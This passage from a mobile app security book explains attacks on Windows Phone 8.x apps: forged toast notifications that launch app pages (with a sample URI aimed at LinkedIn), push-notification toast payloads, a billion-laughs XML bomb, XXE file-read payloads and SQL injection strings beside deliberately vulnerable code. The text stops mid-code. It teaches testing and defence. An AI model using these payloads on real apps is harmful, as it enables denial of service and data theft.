capabilities to be gained on the Samsung Ativ running certain versions of\nWindows Phone, by opening a registry editor in the Diagnosis app that was otherwise inaccessible. (See the\nChapter 10 section, “Building a Test Environment.”)\nSending Arbitrary Toasts\nYou can send arbitrary toast notifications using the Shell_PostMessageToast() API from ShellChromeAPI.dll,\nwhich has the following function prototype:\nWINADVAPI\nVOID\nAPIENTRY\nShell_PostMessageToast(\n_In_ TOAST_MESSAGE* toastMessage\n);\nThe useful metadata for the toast itself is passed in via a pointer to a TOAST_MESSAGE structure, which has the\nfollowing form:\ntypedef struct _TOAST_MESSAGE\n{\nCLSID guid;\nLPCWSTR lpTitle;\nLPCWSTR lpContent;\nLPCWSTR lpUri;\nLPCWSTR lpType;\n} TOAST_MESSAGE;\nThe Windows Phone 8 SDK does not ship with an import library file (.lib) for ShellChromeAPI.dll, so to call\nShell_PostMessageToast() you need to create your own import library and link your native code against it, so\nthat the Windows Phone knows at load time to look in ShellChromeAPI.dll’s export table for the\nShell_PostMessageToast() entry point and henceforth use it.\nYou should fill each of the structure members as follows:\nguid (the app’s GUID, or ProductID)—This is the ProductID that is present in the app’s manifest file\nand also forms part of the full path of the app’s Install and isolated storage directories.\nlpTitle—This is the pointer to the title appearing on the toast notification.\nlpContent— This is the pointer to the message displayed in the toast notification.\nlpUri—This is the pointer to the URI that the toast should send users to if they tap the toast.\nlpType—This is the pointer to the type of toast. The string can be empty.\nBecause the GUID for the app being attacked is discoverable via its manifest and its local data and Install\ndirectories, and because the title, content, and type are mostly arbitrary, the remaining important argument to\nsuitably craft is the URI, lpUri.\nThe URI takes the following form:\napp://GUID/_default#/<AssemblyName>;component/SomePage.xaml?myArgs=value\nGUID is simply the app’s ProductID GUID. Assembly name is the name of the DLL that the target XAML is—\nminus the .dll file extension. The last portion of the URL simply specifies the name of the XAML file, and any\narguments you want to pass to it, which will reach (and most likely be parsed) in the XAML implementation’s\nOnNavigatedTo() handler method.\nFor demonstration purposes, let’s work through a concrete example of a real application and construct a URI so\nthat when the toast is sent and tapped, functionality in that app will be launched, even though the toast was sent\nby an entirely different app (Native Toast Notification Launcher). The app used for demonstration purposes in\nthis case will be LinkedIn, from a non-attacking perspective. From the WMAppManifest.xml file extracted from\nthe app’s Install directory, we know that the app’s product ID GUID is bdc7ae24-9051-474c-a89a-2b18f58d1317.\nFirst, you’ll need to figure out what XAML pages the application actually has. To do this, you need to use your\nfilesystem access to copy a .NET assembly from the app’s Install folder; that is, C:\\Data\\Programs\\\n{GUID}\\Install. After you have it on your test laptop, load it in .NET reflector and browse to Resources on the\nright side panel (the “assembly browser”).\nAs shown in Figure 11.7, you can see a list of all the XAML pages available in the linkedin.dll assembly\n(linkedin will therefore correspond to <AssemblyName> in the URI). Choosing one that sounds interesting,\n/views/companypage.xaml, you will then find the corresponding reflected C# code that implements its logic.\nFigure 11.7 .NET reflector showing XAML pages in a Windows Phone 8 application\nIn looking through the methods, it’s clear that OnNavigatedTo() has indeed been implemented, which will be the\ncode entry point when the XAML page is navigated to. (See Figure 11.8.)\nFigure 11.8 .NET reflector showing an XAML page’s OnNavigatedTo() implementation\nAnalysis of the reflected code for OnNavigatedTo() shows parsing of the query string to extract several\nparameters. These are then used to create a company information page. Parameters named id, name, industry,\nand logourl are parsed out and used in the generated company information page.\nPutting all this together, you can form the following URI to call into the XAML page to have the app generate a\ncompany profile page for a fictional company of your choice, Acme Corp:\napp://bdc7ae24-9051-474c-a89a-2b18f58d1317 /_default#/linkedin;\ncomponent/views/companypage.xaml?id=test&name=Acme%20Corp\n&industry=Exploding%20Tennis%20Balls\n&logourl=http://uva.onlinejudge.org/external/116/p11613.jpg\nNow, to send the toast you need to call Shell_PostMessageSend() with the correct parameters, including the\npreceding URI. The process for creating a toast-sending application involves creating an import library (.lib) for\nShellChromeAPI .dll, writing the necessary native code to call into Shell_PostMessageSend(), linking against\nyour import library, and then writing managed code wrappers and an interface.\nFortunately, cpuguy from the xda-developers.com forum released an application for sending custom toasts; all\nthe app requires is for users to input an app:// URI of their choice! You can therefore use cpuguy’s app for\narbitrary XAML page testing or Cross-Application Navigation Request Forgery.\nThe app, Native Toast Notification Launcher, is available for download as an attachment in cpuguy’s original\npost detailing the discovery: http://forum .xda-developers.com/showthread.php?t=2398275.\nFigure 11.9 shows that the previous app:// URI was typed into the toast launcher app and sent, giving the\nfollowing toast notification.\nFigure 11.9 The Native Toast Notification Launcher sending a toast message\nTapping the toast reveals the screen shown in Figure 11.10, indicating successful launch of the target XAML\npage, showing a fake profile for Acme Corp.\nFigure 11.10 The XAML screen launched after you tap the toast notification\nAlthough the preceding example is relatively benign, it shows how toast notifications can provide an interesting\nand unexpected (by developers) entry point into pages that weren’t supposed to be arbitrarily reachable, and it\nfollows that the potential for security issues because of this is significant. Remember that this technique only\nworks on Windows Phone 8 and appears to be completely fixed on Windows Phone 8.1.\nSending Toast Notifications Remotely\nApplications may register to receive toasts remotely via push notifications received from Microsoft Push\nNotification Service (MPNS). Registering for a push notification channel allows the developer of the app to send\nnotifications, including toasts, to instances of the app. Alternatively, the app’s vendor may register with a cloud\nservice that will do the push notifications for them, because push channel registrations with MPNS are not per\napp, but per device. Introductions to push notifications and toast notifications from a code-level perspective are\navailable on MSDN at http://msdn.microsoft.com/en-us/library/windows/apps/ff402558(v=vs.105).aspx, and\nhttp://msdn.microsoft.com/en-us/library/windows/apps/hh202967(v=vs.105).aspx.\nWhen a device is running Windows Phone 8 (again, not 8.1), and a target app has registered for push\nnotifications, Cross-Application Navigation Forgery attacks identical to those described and shown in the\nprevious pages are theoretically possible to carry out by remote attackers.\nLet’s first examine how apps register for push notifications and then discuss how attackers may be able to send\ntheir own push notifications to carry out Cross-Application Navigation Forgery attacks under certain\ncircumstances.\nApplications open a push notification channel with MPNS using the HttpNotificationChannel API. Each\ninstance of a particular application receives a unique URL from MPNS when it registers for push notifications.\nUltimately, this URL can be used by the app’s vendor or a cloud service to send push notifications to the\nassociated device.\nEvery time an app that wants to receive push notifications launches, it checks for an open push notification\nchannel, because a channel may have been created for it in a previous instance of the app. If an existing push\nchannel is found, the URL will be sent to the application developer or a cloud service that the developer utilizes\nto send push notifications. If an existing channel is not found, a channel is opened, and toast notifications are\nopted into by calling BindToShellToast() on the channel object.\nThe following code illustrates the basic code outline:\nHttpNotificationChannel pushChannel;\n/* try to find an existing push channel */\npushChannel = HttpNotificationChannel.Find(\"myPushChannel\");\n/* no push channel found – open a new one */\nif (pushChannel == null)\n{\npushChannel = new HttpNotificationChannel(\"myPushChannel\");\n// register for this event so that we can capture the\n// URL that refers to our push channel and send it to the\n// app developer or our cloud service */\npushChannel.ChannelUriUpdated += new\nEventHandler<NotificationChannelUriEventArgs>(\nPushChannel_ChannelUriUpdated);\n/* just an error handler */\npushChannel.ErrorOccurred += new\nEventHandler<NotificationChannelErrorEventArgs>(\nPushChannel_ErrorOccurred);\n/* we register for this event if we also want to receive toast\nnotifications when our app is closed */\npushChannel.ShellToastNotificationReceived +=\nnew EventHandler<NotificationEventArgs>(\nPushChannel_ShellToastNotificationReceived);\n/* open the channel */\npushChannel.Open();\n/* we want to receive toast notifications via push */\npushChannel.BindToShellToast();\n}\n/* otherwise, we already had a push channel open */\nelse\n{\n// register for this event so that we can capture the URL\n// that refers to our push channel and send it to the app\n// developer or our cloud service */\npushChannel.ChannelUriUpdated += new\nEventHandler<NotificationChannelUriEventArgs>(\nPushChannel_ChannelUriUpdated);\npushChannel.ErrorOccurred += new\nEventHandler<NotificationChannelErrorEventArgs>(\nPushChannel_ErrorOccurred);\n// we register for this event if we also want to receive\n// toast notifications when our app is closed */\npushChannel.ShellToastNotificationReceived += new\nEventHandler<NotificationEventArgs>(\nPushChannel_ShellToastNotificationReceived);\n/* send our MPNS URL to the developer or cloud service we use */\nSendUrlToDeveloper(pushChannel.ChannelUri.ToString());\n}\n}\nNote that both the if and the else code paths register for the ChannelUriUpdated notification. This results in the\nhandler, PushChannel_ChannelUriUpdated() being called if the MPNS URL associated with the channel changes.\nIf the channel already exists, as in this example, the URL doesn’t change; hence the URL is sent to the app\nvendor or cloud service at the end of the else block.\nIn the if block, which runs if a channel doesn’t already exist, a channel opens and the app registers for toast\nnotifications. Because this creates a new channel, an MPNS URL is associated with it, and the\nChannelUriUpdated event handler will be called. In this handler function is where the URL can be sent to the app\nvendor or cloud service for perusal in sending out push notifications to the device:\nvoid PushChannel_ChannelUriUpdated(\nobject sender, NotificationChannelUriEventArgs e)\n{\nDispatcher.BeginInvoke(() =>\n{\n// send URL to developer/vendor or cloud service\nSendUrlToDeveloper(e.ChannelUri.ToString());\n});\n}\nAt this point, the hypothetical application will have a channel for push notifications, and the app’s vendor or\ncloud service will have received the unique MPNS URL that will ultimately be used to send out push messages\nto the device. The app vendor or cloud service will make HTTP POST requests to the MPNS URL. The exact form\nof the requests and data depends on the push message to be sent to the associated device.\nThe MPNS URL itself has a form similar to the following:\nhttp://db3.notify.live.net/throttledthirdparty/01.00/\nAQZFFGnGGQRI4BFLSKVRYR9xk6FbAgAAAAADKwAAAAQDQYmL98kIxMjIxPOQ\nxOTEvqDlZASQbaFzqTY6k8uML\nClearly, the token part of the URL is long and intentionally unpredictable. It doesn’t indicate which app it is\nassociated with.\nIf an attacker has the URL associated with a device’s push channel, then he is able to send push messages to the\ndevice—in this case, toast notifications. Two general attack scenarios exist here in which an attacker may gain\nknowledge of this URL.\nThe first is that applications may send the URL to the vendor, developer, or cloud service insecurely; that is, via\na plaintext HTTP session, meaning that any suitably positioned attacker can eavesdrop on the URL that is being\ncommunicated, thereby gaining access to deliver push notifications to the device.\nFor the second scenario, notice that the MPNS URL itself is a simple http:// URL, as opposed to https://. This\nmeans that a suitably positioned attacker may also eavesdrop on requests being made to the MPNS URL,\ngaining knowledge of the URL and enough knowledge to make push notifications to the associated device.\nThe second case is, at present, unfortunately unavoidable; this URL was generated by MPNS, and this is the\nURL that must be used, thus the potential for eavesdropping on the URL is quite real.\nIn the first case, eavesdropping potential boils down to the app insecurely transmitting the URL to the vendor or\ncloud service, which is clearly avoidable, so when assessing apps, check for secure communication of the MPNS\nURL to the vendor or cloud service.\nIn any case, if an attacker does indeed glean knowledge of a MPNS URL, all he has to do is make a suitably\ncrafted POST request to it—in XML. The following request sends a toast notification with an app:// URL in it to\nconduct a Cross-Application Navigation Request Forgery attack on a hypothetical would-be vulnerable app:\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<wp:Notification xmlns:wp=\"WPNotification\">\n<wp:Toast>\n<wp:Text1>Hi..</wp:Text1>\n<wp:Text2>This is a toast notification</ wp:Text2>\n<wp:Param>app://acb5a845-77a7-4480-be66-\nb32e927f77c5/_default#/myAssembly;component/SomePage.xaml?myArgs=\nmaliciousData</wp:Param>\n</wp:Toast>\n</wp:Notification>\nThen, assuming the user received and tapped the toast, the XAML page would be navigated to—as long as the OS\nversion is previous to 8.1.\nMitigating the risk involved with attackers attacking instances of an app by their knowledge of the MPNS URL is\npossible. (See Chapter 13.)\nAttacking XML Parsing\nLike apps for other smartphone platforms, many Windows Phone apps need to parse XML either from local\nfiles, or more interestingly, from remote sources. For example, applications may receive XML in HTTP\nresponses, which they parse, store for later parsing, or both.\nThis section covers a few ways a developer can trip up and introduce security bugs when parsing XML in\nWindows Phone apps.\nIntroducing the XDocument API\nThe standard API for parsing XML documents on the Windows Phone 8.x OSes is XDocument; you can find the\nfull documentation for it on MSDN (see http://msdn.microsoft.com/en-\nus/library/system.xml.linq.xdocument(v=vs.110) .aspx).\nXDocument forms part of the LINQ framework. The numerous other XML-parsing APIs that are available in the\ndesktop Windows OSes, such as XmlDocument and XmlTextReader, are unavailable on the Windows Phone 8.x\nplatforms; the only Microsoft-supplied API is XDocument (and associated classes).\nLINQ, which stands for Language-Integrated Query, is a framework that bridges the gap between data and\nobjects. XDocument is a class that allows XML documents to be parsed using LINQ queries—that is, in a syntax\nand fashion that will be quite familiar to readers who use SQL languages.\nConsider this quick example of XDocument’s use to parse a simple XML document to get an idea for how a simple\nbut realistic XML document may be parsed in real code. A hypothetical app may need to parse an XML\ndocument that looks like this:\n<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<employees>\n<employee>\n<name>John Smith</name>\n<jobTitle>CEO</jobTitle>\n<dob>28/12/1970</dob>\n</employee>\n<employee>\n<name>Adam Peters</name>\n<jobTitle>Consultant</jobTitle>\n<dob>03/04/1987</dob>\n</employee>\n<employee>\n<name>Jacob Matthews</name>\n<jobTitle>Accountant</jobTitle>\n<dob>06/11/1981</dob>\n</employee>\n</employees>\nGiven a file like this, you may want to compile a list of all employees whom are detailed in the document. To do\nthis, you might use something similar to the following code:\nXmlReader reader = XmlReader.Create(\"Assets/XMLFile2.xml\");\n// parse the XML file\nXDocument xmlDoc = XDocument.Load(reader);\nvar q = from c in xmlDoc.Descendants(\"employee\")\nselect (string)c.Element(\"name\") + (string)c.Element(\"title\");\nstring allEmployees = \"\";\n// concatenate all detailed employees together into a string\nforeach (string name in q) {\nallEmployees += name + \". \";\n}\n// show in message box\nMessageBox.Show(allEmployees);\nAs expected, you’ll get the message box listing the names of all the employees in the XML file. (See Figure\n11.11.)\nFigure 11.11 Names parsed out from the XML document\nUsing LINQ to query XML documents can prove to be very convenient and powerful due to its systematic and\nlogical nature.\nAlthough in the previous example we used XDocument.Load() to parse an XML document from disk, you would\nuse XDocument.Parse()to parse XML documents that are contained within string objects. Also other overloads of\nthe Load() method exist. (See the XDocument documentation for more details; http://msdn .microsoft.com/en-\nus/library/system.xml.linq.xdocument(v=vs.110).aspx.)\nSo what about the classic XML security problem—DTD (Document Type Definition) parsing? And parsing of\nDTDs that resolve to external entities?\nFortunately for developers, XDocument’s DTD parsing settings are secure by default; that is, DTD parsing is set to\nprohibited, unless the developer explicitly enables it on her XDocument object.\nIn real-world apps, however, DTD parsing is sometimes enabled, for a few possible reasons:\nCode fragments are copied in from other sources because they just work. Examples include code solutions\nfound on resources such as Internet forums, including Stack Overflow.\nDocuments being parsed simply rely on DTDs being resolved, so to correctly parse documents, developers\nbite the bullet and simply enable DTD parsing to avoid breaking their apps.\nWhen apps use XDocument for XML parsing and their documents require the use of DTDs, the setting must be\nenabled with code like this:\nvar settings = new XmlReaderSettings { DtdProcessing =\nDtdProcessing.Parse };\nXmlReader reader = XmlReader.Create(\"myFile.xml\", settings);\n// parse the XML file\nXDocument xmlDoc = XDocument.Load(reader);\nIf you come across an app that does have DTD parsing enabled, two general issues have a security impact: entity\nexpansion denial-of-service attacks (otherwise known as a “billion laughs”), and external entity resolution\nattacks (XXE). We discuss these next.\nEntity Expansion Denial-of-Service Attacks\nThe XML standard allows for nested entities in inline DTDs. A side effect of resolving nested entities is that\ncreating a relatively small piece of XML that effectively acts as an XML bomb is possible.\nConsider the following piece of XML, from an MSDN blog article on XML DoS and external entity attacks\n(located at http://msdn.microsoft.com/en-us/magazine/ee335713.aspx):\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\n&lol2;\">\n<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\n&lol3;\">\n<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\n&lol4;\">\n<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\n&lol5;\">\n<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\n&lol6;\">\n<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\n&lol7;\">\n<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\n&lol8;\">\n]>\n<lolz>&lol9;</lolz>\nThe entity lol9 is made up of ten lol8 entities, which itself is made up of ten lol7 entities, which in turn is\nmade up of ten lol6 entities and so on and so forth, until all entities have been expanded to lol strings.\nVisualizing how this actually adds up to a lot of entity expansions is easy. In fact, this small piece of XML ends\nup resolving to one billion lol strings, hence the name “billion laughs,” and this data consumes around 3GB in\nmemory. In addition to consuming vast amounts of the runtime’s heap space, the series of operations are also\nresource intensive in terms of processor usage.\nYou can demonstrate this to yourself by having the following logic in a test application, and then running it on\nthe device from Visual Studio:\nstring lol = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE lolz [\n<!ENTITY lol \\\"lol\\\"><!ENTITY lol2\n\\\"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\n&lol;\\\"><!ENTITY lol3\n\\\"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\n&lol2;\\\"><!ENTITY lol4\n\\\"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\n&lol3;\\\"><!ENTITY lol5\n\\\"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\n&lol4;\\\"><!ENTITY lol6\n\\\"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\n&lol5;\\\"><!ENTITY lol7\n\\\"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\n&lol6;\\\"><!ENTITY lol8\n\\\"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\n&lol7;\\\"><!ENTITY lol9\n\\\"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\n&lol8;\\\">]><lolz>&lol9;</lolz>\";\nvar settings = new XmlReaderSettings { DtdProcessing =\nDtdProcessing.Parse };\nbyte[] data = Encoding.UTF8.GetBytes(lol);\nMemoryStream stm = new MemoryStream(data, 0, data.Length);\nXmlReader xmlReader = XmlReader.Create(stm, settings);\n// parse the XML file\nXDocument xmlDoc = XDocument.Load(xmlReader);\nEventually, after several minutes, the app will throw an unhandled System .OutOfMemory exception, and the\napplication will crash. (See Figure 11.12.)\nFigure 11.12 Out-of-memory exception reported by Visual Studio due to a “billion laughs” attack\nNow, obviously because we’re talking about applications running on mobile devices and not on server platforms,\nthe possibility of a DoS occurring on a mobile app may seem a little bit unlikely. In many cases, this may be\ntrue, but if an app pulls an XML bomb of this kind from the Internet, saves it to disk, and then attempts to parse\nit every time the app runs, users have a much more annoying problem, especially if the app is critical to their\nwork or otherwise important to them. A persistent DoS like this could result in users’ having to reinstall the app,\nand perhaps losing important data associated with it.\nExternal Entity Expansion Attacks\nExternal entity expansion attacks (XXEs) are decidedly more interesting than XML bomb DoS attacks,\nparticularly because they often allow the disclosure of files from the host being attacked.\nXDocument is no exception; as long as DTD parsing has been enabled on the XDocument object being used for\nparsing, file disclosure attacks are sometimes possible. However, restrictions are imposed by Windows Phone’s\nsandboxing model. We’ll run through those now with real code and outputs so that you are aware of when file\ndisclosure attacks via XXE are possible, and when they’re not, in Windows Phone 8.x apps.\nConsider a sample application that contains the following vulnerable code:\nvar settings = new XmlReaderSettings { DtdProcessing =\nDtdProcessing.Parse };\nXmlReader xmlReader = XmlReader.Create(\"Assets/XMLFile.xml\", settings);\n// parse the XML file\nXDocument xmlDoc = XDocument.Load(xmlReader);\nvar q = from c in xmlDoc.Descendants(\"someTag\") select(string)\nc.Element(\"foo\");\nstring secretContents = \"\";\n// concatenate all detailed employees together into a string\nforeach (string data in q) {\nsecretContents += data + \". \";\n}\n// show in message box\nMessageBox.Show(secretContents);\nWith a bit of analysis, you can easily see that this code parses an XML file called XMLFile1.xml, parses out the\nvalues of any <foo> tags found within the document, and displays them in a message box.\nNow create a new XML file (called XMLFile1.xml) in the Assets directory of your application. Insert the following\ncontents (via Visual Studio’s Solution Explorer):\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///C:\\secretFile.txt\" >\n]>\n<someTag>\n<foo>&xxe;</foo>\n</someTag>\nThis XML file causes the parser to attempt to resolve an external entity that clearly lies outside the app’s\nsandbox. Run your app and you’ll receive a System .Xml.XmlException with a reason string reading:\n\"An error has occurred while opening external entity\n'file:///C:/secretFile.txt': --> System.Xml.XmlException:\nCannot open 'file:///C:/secretFile.txt'. The Uri parameter\nmust be a relative path pointing to content inside the\nSilverlight application's XAP package ...\"\nReplace your XML file’s content with the following, and run your app again:\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"http://www.google.co.uk/abcd\" >\n]>\n<someTag>\n<foo>&xxe;</foo>\n</someTag>\nYour app will receive a very similar exception; more specifically, with a reason string reading:\n\"An error has occurred while opening external entity\n'http://www.google.co.uk/abcd': --> System.Xml.XmlException:\nCannot open 'http://www.google.co.uk/abcd'. The Uri parameter\nmust be a relative path pointing to content inside the\nSilverlight application's XAP package ...\"\nThe message delivered with the exception summarizes a serious limitation in file-stealing capabilities as a result\nof sandboxing: only files that reside in the app’s Install directory can be stolen (that is, C:\\Data\\Programs\\\n{GUID}\\Install). This is the directory where the app’s executables, manifest, and other pre-packaged assets are\nplaced by the OS when the app is installed, and this directory and its subdirectories are read-only by Windows\nPhone sandboxing restrictions.\nFiles in the app’s isolated storage (C:\\Data\\Users\\DefApps\\APPDATA\\{GUID}) are not accessible as external\nentities. Unfortunately for attackers, this means that stealing files stored at runtime by apps is not possible. It is\npossible to reference the app’s pre-packaged files only as external entities.\nThis rules out interesting files stored by apps, such as cache, cookies, and key and credential files. However,\nsome applications may pre-package interesting files such as certificates or credential files, which would be in the\napplication’s Install directory (or a subdirectory), and would therefore be viable targets for theft via XXE.\nWith the understanding that sandboxing restrictions apply to external entity resolutions, even with a good target\nfile identified, the problem still exists of how, as an attacker, to exfiltrate the file from off the device to an\nattacker-controlled box.\nWhether this is possible depends on what the application does with the parsed entity. Some apps may, at some\npoint, send parts of the parsed XML document back to the developer’s server or another server. In this case, the\npossibility exists for would-be attackers to intercept or otherwise receive the resolved external entity file’s\ncontents.\nIn any case, as demonstrated here, the XDocument will indeed parse files as external entities. In your sample\nvulnerable app, place the following XML contents in Assets/XMLFile.xml (via Solution Explorer),\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"secret.txt\" >\n]>\n<someTag>\n<foo>&xxe;</foo>\n</someTag>\nand create a file named secret.txt, also in the Assets folder, again via Solution Explorer, and insert “secret\ndata” using the text editor.\nUpon running your sample vulnerable app identical to the one laid out previously in this section, the API parses\nthe external element (xxe), and the LINQ query fills the secretContents string object with the resolved data: the\ncontents of secret.txt. The message box shown in Figure 11.13 should appear.\nFigure 11.13 Result of external entity resolution of the “secret file” in a message box\nAn attacker’s ability to exfiltrate data from the device will generally depend on whether the app somehow\ntransmits the data (from the resolved external entity) elsewhere via the network at some point, or uses it in a\nway that may otherwise be accessible to an attacker; for example, in a JavaScript DOM that may be\ncompromised by an attacker via WebBrowser script injection.\nAttacking Databases\nThis section takes a look at how database interactions can sometimes be exploited in Windows Phone 8.x\napplications. We say “database interactions” instead of just “SQL injection” because we want to first briefly\nmention the LINQ to SQL API—Windows Phone 8.x’s standard way of accessing local databases. We’ll then\nmove onto SQL injection bugs and how they can be introduced via common (third-party) database libraries.\nLINQ to SQL\nLINQ to SQL is now used for all (native) database operations in Windows Phone applications, including defining\nschemas, reading to, writing to, and otherwise manipulating local databases. Windows Phone 8.x does not\nsupport any of the traditional SQL-based APIs at all. You can find WP8.x-specific aspects at the MSDN page\nlocated at http://msdn.microsoft.com/en-us/library/windows/apps/hh202872(v=vs.105).aspx.\nLINQ to SQL adds a layer between LINQ and TSQL that ultimately means that SQL injection in apps using\nWindows Phone 8.x’s native database capabilities is not possible.\nTherefore, if the app is using LINQ to SQL, it is safe from SQL injection.\nSQLite and SQLCipher\nDespite using LINQ to SQL–style interaction with databases, some developers still prefer to interact with their\ndatabases with SQL.\nIn addition to being popular in general, SQLite has also found popularity and frequent usage among Windows\nPhone developers. The reasons possibly include familiarity and known reliability, but whatever the reasons,\nseeing SQLite being used for local data storage in Phone Store apps is common.\nSQLite provides versions of its engine that work on both Windows Phone 8 and 8.1. The package SQLite\nprovides is a native library. Krueger Systems developed a set of wrappers called sqlite-net\n(https://github.com/praeclarum/sqlite-net) that allows the native SQLite API to be accessed from C# code;\nhowever, sqlite-net doesn’t support the Windows Phone SQLite library.\nFortunately, Peter Huene created a set of native wrappers named sqlite-net-wp8\n(https://github.com/peterhuene/sqlite-net-wp8) that allow sqlite-net to integrate with the Windows Phone\nversion of SQLite.\nThe Windows Phone SQLite engine is installable in Visual Studio via Tools Extensions and Updates, and sqlite-\nnet is available as a NuGet package, also installable in Visual Studio via the Package Manager Console. General\ninstructions for how to install SQLite for Windows Phone into your Visual Studio instance, as well as how to\ninstall sqlite-net and sqlite-net-wp8 code wrappers to your projects, are available at\nhttp://blogs.windows.com/buildingapps/2013/03/12/using-the-sqlite-database-engine-with-windows-\nphone-8-apps/. Following this guide before reading on is recommended if you want to follow the examples in\nthis section.\nSQLCipher (http://sqlcipher.net/blog/2014/1/13/introducing-sqlcipher- for-windows-phone-8-and-\nwindows-runtim.html) is based closely on sqlite-net. As the name suggests, it adds cryptography capabilities to\nSQLite databases. Because its API is so close to that provided by sqlite-net, the contents of this section are also\napplicable to apps that use SQLCipher for their databases.\nThe wrapper API provides safe methods for querying and otherwise manipulating databases without having to\nactually deal with SQL queries directly, and the API also caters for parameterization to be used when SQL\nqueries are being constructed manually.\nAPI provides the following methods for raw SQL statement execution:\ndb.CreateCommand()\ndb.Execute()\ndb.ExecuteScalar()\ndb.Query()\ndb.Query<T>()\ndb.DeferredQuery()\ndb.DeferredQuery<T>()\nFor instance, Query<T>() can be used safely; that is, by utilizing parameterization, but it can also be used\ninsecurely by constructing queries by basic string concatenation with no metacharacter escaping. All it would\ntake in each of the vulnerable examples is for the attacker to place an apostrophe (') in his controlled value,\nthereby breaking out of the intended SQL statement with the possibility of altering the meaning of the SQL\nquery itself. Consider the following safe and unsafe examples. The unsafe patterns, of course, allow SQL\ninjection, assuming attackerInput is indeed an attacker-controlled string.\nSafe\nvar db = new SQLiteConnection(Path.Combine(\nApplicationData.Current.LocalFolder.Path, \"test.db\"));\n[ ... ]\nSQLiteCommand cmd = db.CreateCommand(\n\"select * from Stock where Symbol = ?\", attackerInput);\n// get all stock items with name in question\nList<Stock> stockList = cmd.ExecuteQuery<Stock>();\n// and then display the names and stock IDs\nforeach(Stock item in stockList) {\nMessageBox.Show(item.Symbol + \" has item ID:\" + item.Id);\n}\nVulnerable\nvar db = new SQLiteConnection(Path.Combine(\nApplicationData.Current.LocalFolder.Path, \"test.db\"));\n[ ... ]\nSQLiteCommand cmd = db.CreateCommand(\n\"select * from Stock where Symbol = '\" + attackerInput + \"'\");\n// get all stock items with name in question\nList<Stock> stockList = cmd.ExecuteQuery<Stock>();\n// and then display the names and stock IDs\nforeach(Stock item in stockList) {\nMessageBox.Show(item.Symbol + \" has item ID:\" + item.Id);\n}\nSafe\n[ ... ]\n// get all stock items with name in question\nList<Stock> results = db.Query<Stock>(\n\"select * from Stock where Symbol = ?\", attackerInput);\n// and then display the names and stock IDs\nforeach(Stock item in results) {\nMessageBox.Show(item.Symbol + \" has item ID:\" + item.Id);\n}\n[ ... ]\nVulnerable\n// get all stock items with name in question\nList<Stock> results = db.Query<Stock>(\n\"select * from Stock where Symbol =\n'\" + attackerInput + \"'\");\n// and then display the names and stock IDs\nforeach(Stock item in results) {\nMessageBox.Show(item.Symbol + \" has item ID:\" + item.Id);\n}\n[ ... ]\nRunning either of the preceding vulnerable code samples with attackerInput being equal to “aaaaaa’aaa” results\nin a SQLiteException being thrown due to a SQL syntax error, as shown in Figure 11.14.\nFigure 11.14 SQLite syntax error\nSQL injection bugs are easy to spot when code is available or assemblies have been extracted from a device and\nreversed to recover code (that is, using .NET reflector). If you’re manually testing an application for SQL\ninjection, and insertion of an apostrophe (') causes a crash, there’s a decent chance that SQLite threw a\nSQLiteException, which went unhandled and resulted in the app crashing. In these cases, you may have a SQL\ninjection bug on your hands, which you’ll want to look into to verify whether an injection issue exists or not.\nIf you’re unsure of whether a SQL injection bug exists, you can use conditional clauses and observe whether the\napp’s behavior changes in the way you expect. For example, if a SQL injection bug existed in a query to select the\nemployee with a certain email address, and you injected,\ntest@fake.com' OR 1=1—\nand the app attempted to return all users in its database, you would be fairly certain you’ve just hit a SQL\ninjection bug. Moreover, this may be interesting from the attacker’s perspective in terms of information leakage\nby the app. Equally, if you injected:\nadmin@company.com' AND 1=1—\nand you knew that admin@company.com existed in the database, you could then compare the behavior with\nwhat happens when you inject:\nadmin@company.com' AND 1=2—\nThat is, in the second case, where you injected AND 1=2—, you would expect the query to return nothing (let’s\nassume the query is simple), because 1=2 is obviously false, and the conditional was concerned with “and” logic.\nThe potential for entry points into potentially injectable SQL queries is worth considering; think XAML page\nentry points (that is, OnNavigatedTo and resulting code paths) via toast notifications and protocol handlers. For\nexample, imagine a part of an app responsible for looking up all contacts with a certain surname. Code similar to\nthe following could easily appear in an XAML page’s OnNavigatedTo() entry point:\nprotected override void OnNavigatedTo(NavigationEventArgs e) {\nstring surname;\nif (this.NavigationContext.QueryString.ContainsKey(\"surname\"))\n{\nphoneNumber = 